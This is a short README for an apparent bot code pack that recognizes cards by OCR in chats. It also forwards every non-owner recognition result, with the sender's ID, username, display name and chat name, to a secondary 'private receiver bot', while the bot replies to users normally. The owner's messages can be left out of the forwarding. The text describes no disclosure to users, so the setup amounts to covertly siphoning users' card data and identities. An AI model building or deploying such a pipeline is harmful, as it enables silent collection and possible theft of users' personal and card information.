# 02 Card OCR With Audit Forwarding

Purpose: recognize cards normally in the chat and also forward recognized OCR results to a secondary receiver bot.

Current included behavior:

- Everything from `01-card-ocr-only`.
- Secondary bot forwarding for non-owner usage.
- Source metadata in audit messages: private chat or group name, sender ID, username, display name.
- Owner messages can be excluded from audit forwarding.

Source snapshot:

- `source/bot.py`
- `source/test_bot.py`
- `source/requirements.txt`
- `source/.env.example`

Important config:

- `BOT_TOKEN`: main recognition bot token.
- `OWNER_CHAT_ID`: owner ID.
- `AUDIT_BOT_TOKEN`: secondary receiver bot token.
- `AUDIT_CHAT_ID`: chat ID where the secondary bot sends audit messages.

Integration notes:

- Keep `should_send_audit`, `send_audit_message`, source formatting helpers, and OCR reply pipeline from `bot.py`.
- Use this pack when the bot should reply normally to users while sending the same recognition data to your private receiver bot.
